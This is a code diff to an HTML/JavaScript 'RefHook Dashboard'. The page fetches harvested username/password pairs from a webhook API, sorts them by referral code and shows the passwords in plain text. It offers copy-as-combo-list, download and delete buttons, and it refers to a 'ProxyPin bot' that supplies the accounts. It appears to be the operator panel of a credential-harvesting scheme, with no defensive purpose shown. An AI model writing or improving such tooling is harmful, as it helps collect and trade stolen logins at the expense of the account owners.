@@ -8,11 +8,9 @@
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body { font-family: 'Inter', sans-serif; background: #0a0a0f; color: #e2e8f0; min-height: 100vh; }
-
     .header {
       background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
-      padding: 24px 32px;
-      border-bottom: 1px solid rgba(99, 102, 241, 0.2);
+      padding: 24px 32px; border-bottom: 1px solid rgba(99, 102, 241, 0.2);
       display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px;
     }
     .header h1 {
@@ -23,30 +21,21 @@
     .header p { color: #94a3b8; font-size: 13px; margin-top: 4px; }
     .live-dot { display: inline-block; width: 8px; height: 8px; background: #4ade80; border-radius: 50%; animation: blink 1.5s infinite; margin-right: 6px; }
     @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
-
     .container { max-width: 1200px; margin: 0 auto; padding: 24px; }
-
-    .stats {
-      display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
-      gap: 16px; margin-bottom: 24px;
-    }
+    .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 16px; margin-bottom: 24px; }
     .stat-card {
       background: linear-gradient(135deg, rgba(30, 30, 50, 0.8), rgba(20, 20, 40, 0.9));
       border: 1px solid rgba(99, 102, 241, 0.15); border-radius: 12px; padding: 20px; text-align: center;
-      transition: transform 0.2s, border-color 0.2s;
+      transition: transform 0.2s;
     }
-    .stat-card:hover { transform: translateY(-2px); border-color: rgba(99, 102, 241, 0.4); }
+    .stat-card:hover { transform: translateY(-2px); }
     .stat-card .value {
       font-size: 32px; font-weight: 700;
       background: linear-gradient(135deg, #60a5fa, #818cf8);
       -webkit-background-clip: text; -webkit-text-fill-color: transparent;
     }
     .stat-card .label { font-size: 11px; color: #94a3b8; text-transform: uppercase; letter-spacing: 1px; margin-top: 4px; }
-
-    /* Ref Tabs */
-    .ref-tabs {
-      display: flex; gap: 8px; margin-bottom: 20px; flex-wrap: wrap; align-items: center;
-    }
+    .ref-tabs { display: flex; gap: 8px; margin-bottom: 20px; flex-wrap: wrap; }
     .ref-tab {
       background: rgba(30, 30, 50, 0.6); border: 1px solid rgba(99, 102, 241, 0.15);
       color: #94a3b8; padding: 8px 18px; border-radius: 8px; cursor: pointer;
@@ -58,19 +47,12 @@
       background: linear-gradient(135deg, rgba(99, 102, 241, 0.2), rgba(139, 92, 246, 0.2));
       border-color: #818cf8; color: #fff;
     }
-    .ref-tab .count {
-      background: rgba(99, 102, 241, 0.3); padding: 2px 8px; border-radius: 10px;
-      font-size: 11px; font-weight: 600; color: #a5b4fc;
-    }
+    .ref-tab .count { background: rgba(99, 102, 241, 0.3); padding: 2px 8px; border-radius: 10px; font-size: 11px; font-weight: 600; color: #a5b4fc; }
     .ref-tab.active .count { background: rgba(99, 102, 241, 0.5); color: #fff; }
-
-    .controls {
-      display: flex; gap: 12px; margin-bottom: 20px; flex-wrap: wrap; align-items: center;
-    }
+    .controls { display: flex; gap: 12px; margin-bottom: 20px; flex-wrap: wrap; align-items: center; }
     .controls input {
       background: #1e1e30; border: 1px solid rgba(99, 102, 241, 0.2); color: #e2e8f0;
-      padding: 10px 16px; border-radius: 8px; font-family: 'Inter', sans-serif; font-size: 14px; outline: none;
-      min-width: 200px;
+      padding: 10px 16px; border-radius: 8px; font-family: 'Inter', sans-serif; font-size: 14px; outline: none; min-width: 200px;
     }
     .controls input:focus { border-color: #818cf8; }
     .btn {
@@ -81,9 +63,9 @@
     .btn:hover { opacity: 0.85; }
     .btn-outline { background: transparent; border: 1px solid rgba(99, 102, 241, 0.3); color: #818cf8; }
     .btn-outline:hover { background: rgba(99, 102, 241, 0.1); }
-    .btn-green { background: linear-gradient(135deg, #059669, #10b981); }
     .btn-red { background: linear-gradient(135deg, #dc2626, #ef4444); }
-
+    .btn-red:hover { opacity: 0.85; }
+    .btn-sm { padding: 4px 10px; font-size: 11px; border-radius: 6px; }
     .table-wrap {
       background: rgba(15, 15, 25, 0.8); border: 1px solid rgba(99, 102, 241, 0.1);
       border-radius: 12px; overflow: hidden;
@@ -100,10 +82,8 @@
     }
     tr:hover td { background: rgba(99, 102, 241, 0.05); }
     .ref-tag { background: rgba(34, 197, 94, 0.15); color: #4ade80; padding: 2px 8px; border-radius: 4px; font-size: 11px; }
-
     .empty { text-align: center; padding: 60px 20px; color: #64748b; }
     .empty span { font-size: 48px; display: block; margin-bottom: 12px; }
-
     .ref-header {
       display: flex; justify-content: space-between; align-items: center;
       margin-bottom: 16px; padding: 16px 20px;
@@ -112,6 +92,12 @@
     }
     .ref-header h2 { font-size: 18px; color: #a5b4fc; }
     .ref-header .meta { font-size: 12px; color: #64748b; }
+    .toast {
+      position: fixed; bottom: 24px; right: 24px; background: #1e293b; color: #e2e8f0;
+      padding: 12px 20px; border-radius: 8px; border: 1px solid rgba(99, 102, 241, 0.3);
+      font-size: 13px; z-index: 999; display: none; animation: fadeIn 0.3s;
+    }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
   </style>
 </head>
 <body>
@@ -120,163 +106,152 @@
       <h1>⚡ RefHook Dashboard</h1>
       <p><span class="live-dot"></span>Auto-refreshes every 5s • Credentials saved per ref ID</p>
     </div>
-    <div>
-      <button class="btn" onclick="refresh()">🔄 Refresh</button>
-    </div>
+    <button class="btn" onclick="refresh()">🔄 Refresh</button>
   </div>
 
   <div class="container">
     <div class="stats">
-      <div class="stat-card">
-        <div class="value" id="totalCreds">0</div>
-        <div class="label">Total Accounts</div>
-      </div>
-      <div class="stat-card">
-        <div class="value" id="totalRefs">0</div>
-        <div class="label">Ref Codes</div>
-      </div>
-      <div class="stat-card">
-        <div class="value" id="lastUpdate">—</div>
-        <div class="label">Last Update</div>
-      </div>
+      <div class="stat-card"><div class="value" id="totalCreds">0</div><div class="label">Total Accounts</div></div>
+      <div class="stat-card"><div class="value" id="totalRefs">0</div><div class="label">Ref Codes</div></div>
+      <div class="stat-card"><div class="value" id="lastUpdate">—</div><div class="label">Last Update</div></div>
     </div>
-
     <div class="ref-tabs" id="refTabs"></div>
-
     <div id="refContent"></div>
   </div>
+  <div class="toast" id="toast"></div>
 
   <script>
     let data = {};
     let activeRef = 'all';
+
+    function toast(msg) {
+      const t = document.getElementById('toast');
+      t.textContent = msg; t.style.display = 'block';
+      setTimeout(() => t.style.display = 'none', 3000);
+    }
 
     async function refresh() {
       try {
         const r = await fetch('/api/webhook');
         const d = await r.json();
         if (!d.ok) return;
-
         document.getElementById('totalCreds').textContent = d.totalCreds || 0;
         const refs = Object.keys(d.sessions || {});
         document.getElementById('totalRefs').textContent = refs.length;
-
         data = d.sessions || {};
-
-        // Fetch full creds for each ref
         for (const ref of refs) {
           const rr = await fetch('/api/webhook?ref=' + encodeURIComponent(ref));
           const rd = await rr.json();
           if (rd.creds) data[ref].creds = rd.creds;
         }
-
-        // Find latest update
         let latest = null;
         for (const s of Object.values(data)) {
           if (s.lastUpdate && (!latest || s.lastUpdate > latest)) latest = s.lastUpdate;
         }
         document.getElementById('lastUpdate').textContent = latest ? timeAgo(latest) : '—';
-
-        renderTabs();
-        renderContent();
+        renderTabs(); renderContent();
       } catch (e) { console.error(e); }
     }
 
     function renderTabs() {
-      const tabs = document.getElementById('refTabs');
       const refs = Object.keys(data);
-      let totalAll = 0;
-      refs.forEach(r => totalAll += (data[r].total || 0));
-
+      let totalAll = 0; refs.forEach(r => totalAll += (data[r].creds?.length || data[r].total || 0));
       let html = `<div class="ref-tab ${activeRef === 'all' ? 'active' : ''}" onclick="setRef('all')">All <span class="count">${totalAll}</span></div>`;
       for (const ref of refs) {
-        html += `<div class="ref-tab ${activeRef === ref ? 'active' : ''}" onclick="setRef('${ref}')">${ref} <span class="count">${data[ref].total || 0}</span></div>`;
+        const cnt = data[ref].creds?.length || data[ref].total || 0;
+        html += `<div class="ref-tab ${activeRef === ref ? 'active' : ''}" onclick="setRef('${ref}')">${ref} <span class="count">${cnt}</span></div>`;
       }
-      tabs.innerHTML = html;
+      document.getElementById('refTabs').innerHTML = html;
     }
 
-    function setRef(ref) {
-      activeRef = ref;
-      renderTabs();
-      renderContent();
-    }
+    function setRef(ref) { activeRef = ref; renderTabs(); renderContent(); }
 
     function renderContent() {
-      const content = document.getElementById('refContent');
       const refs = activeRef === 'all' ? Object.keys(data) : [activeRef];
-
       if (refs.length === 0 || (refs.length === 1 && !data[refs[0]])) {
-        content.innerHTML = '<div class="empty"><span>📡</span>No data yet<br>Run the ProxyPin bot to start receiving accounts</div>';
+        document.getElementById('refContent').innerHTML = '<div class="empty"><span>📡</span>No data yet<br>Run the ProxyPin bot to start</div>';
         return;
       }
-
       let html = '';
       for (const ref of refs) {
-        const s = data[ref];
-        if (!s) continue;
+        const s = data[ref]; if (!s) continue;
         const creds = s.creds || [];
-
         html += `
           <div class="ref-header">
             <div>
               <h2>🔗 ${ref}</h2>
-              <div class="meta">${creds.length} accounts • ${s.batches || 0} batches • Last: ${s.lastUpdate ? timeAgo(s.lastUpdate) : '—'}</div>
+              <div class="meta">${creds.length} accounts • ${s.batches || 0} batches</div>
             </div>
             <div style="display:flex;gap:8px">
               <button class="btn btn-outline" onclick="copyRef('${ref}')">📋 Copy</button>
               <button class="btn btn-outline" onclick="downloadRef('${ref}')">💾 Download</button>
+              <button class="btn btn-red btn-sm" onclick="deleteRef('${ref}')">🗑 Delete All</button>
             </div>
           </div>
-
           <div class="controls">
             <input type="text" placeholder="Search username..." oninput="filterTable('${ref}', this.value)">
           </div>
-
           <div class="table-wrap" style="margin-bottom:24px">
             <table>
-              <thead><tr><th>#</th><th>Username</th><th>Password</th><th>Ref ID</th><th>Time</th></tr></thead>
+              <thead><tr><th>#</th><th>Username</th><th>Password</th><th>Ref</th><th>Time</th><th>Action</th></tr></thead>
               <tbody id="tbody_${ref}">
-                ${creds.map((c, i) => `<tr>
+                ${creds.map((c, i) => `<tr id="row_${ref}_${i}">
                   <td>${i + 1}</td>
                   <td>${c.u}</td>
                   <td>${c.p}</td>
                   <td><span class="ref-tag">${c.rid || ref}</span></td>
                   <td style="font-size:11px;color:#64748b">${c.t ? new Date(c.t).toLocaleTimeString() : ''}</td>
+                  <td><button class="btn btn-red btn-sm" onclick="deleteOne('${ref}','${c.u}')">✕</button></td>
                 </tr>`).join('')}
               </tbody>
             </table>
-            ${creds.length === 0 ? '<div class="empty"><span>📡</span>No accounts for this ref yet</div>' : ''}
-          </div>
-        `;
+            ${creds.length === 0 ? '<div class="empty"><span>📡</span>No accounts yet</div>' : ''}
+          </div>`;
       }
-      content.innerHTML = html;
+      document.getElementById('refContent').innerHTML = html;
     }
 
-    function filterTable(ref, query) {
-      const tbody = document.getElementById('tbody_' + ref);
-      if (!tbody) return;
-      const rows = tbody.querySelectorAll('tr');
-      const q = query.toLowerCase();
-      rows.forEach(row => {
-        const user = row.cells[1]?.textContent?.toLowerCase() || '';
-        row.style.display = user.includes(q) ? '' : 'none';
+    function filterTable(ref, q) {
+      const tbody = document.getElementById('tbody_' + ref); if (!tbody) return;
+      tbody.querySelectorAll('tr').forEach(row => {
+        row.style.display = (row.cells[1]?.textContent || '').toLowerCase().includes(q.toLowerCase()) ? '' : 'none';
       });
     }
 
+    async function deleteOne(ref, username) {
+      if (!confirm('Delete ' + username + '?')) return;
+      const r = await fetch('/api/webhook', {
+        method: 'DELETE', headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ ref, username })
+      });
+      const d = await r.json();
+      toast('Deleted ' + username + ' (' + d.deleted + ' removed)');
+      refresh();
+    }
+
+    async function deleteRef(ref) {
+      if (!confirm('Delete ALL accounts for ref=' + ref + '?')) return;
+      const r = await fetch('/api/webhook', {
+        method: 'DELETE', headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ ref, deleteAll: true })
+      });
+      const d = await r.json();
+      toast('Deleted ' + (d.deleted || 0) + ' accounts for ' + ref);
+      activeRef = 'all';
+      refresh();
+    }
+
     function copyRef(ref) {
-      const creds = (data[ref]?.creds || []);
-      const text = creds.map(c => c.u + ':' + c.p).join('\n');
-      navigator.clipboard.writeText(text);
-      alert('Copied ' + creds.length + ' accounts for ' + ref + '!');
+      const creds = data[ref]?.creds || [];
+      navigator.clipboard.writeText(creds.map(c => c.u + ':' + c.p).join('\n'));
+      toast('Copied ' + creds.length + ' accounts!');
     }
 
     function downloadRef(ref) {
-      const creds = (data[ref]?.creds || []);
-      const text = creds.map(c => c.u + ':' + c.p).join('\n');
-      const blob = new Blob([text], { type: 'text/plain' });
-      const a = document.createElement('a');
-      a.href = URL.createObjectURL(blob);
-      a.download = ref + '_creds_' + new Date().toISOString().slice(0, 10) + '.txt';
-      a.click();
+      const creds = data[ref]?.creds || [];
+      const blob = new Blob([creds.map(c => c.u + ':' + c.p).join('\n')], { type: 'text/plain' });
+      const a = document.createElement('a'); a.href = URL.createObjectURL(blob);
+      a.download = ref + '_creds.txt'; a.click();
     }
 
     function timeAgo(iso) {
